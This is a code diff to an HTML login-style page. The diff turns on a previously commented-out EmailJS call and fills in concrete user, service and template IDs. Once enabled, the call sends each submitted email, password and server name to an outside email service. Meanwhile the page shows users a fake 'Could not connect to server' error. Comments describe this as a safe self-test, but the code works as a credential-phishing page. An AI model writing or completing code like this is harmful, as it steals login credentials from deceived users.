@@ -7,7 +7,7 @@
   <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script type="text/javascript">
      (function(){
-        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
+        emailjs.init("f0SVFShSGNOwyB-sm"); // Your User ID
      })();
   </script>
 </head>
@@ -37,15 +37,19 @@
       // Show a fake error message
       document.getElementById("message").innerText = "Error: Could not connect to server.";
 
-      // Optional: Send yourself a test email safely (only to an email you control)
-      /*
-      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+      // Send a test email safely to yourself
+      emailjs.send("service_lspaiuv", "template_w3426ag", {
         email: email,
         password: password,
         server: server
       })
-      .then(function() { console.log("Test email sent."); });
-      */
+      .then(function() { 
+        console.log("Test email sent safely!"); 
+        alert("Form submitted! (Test email sent to yourself)");
+      })
+      .catch(function(error) {
+        console.error("Failed to send email:", error);
+      });
     });
   </script>
 </body>
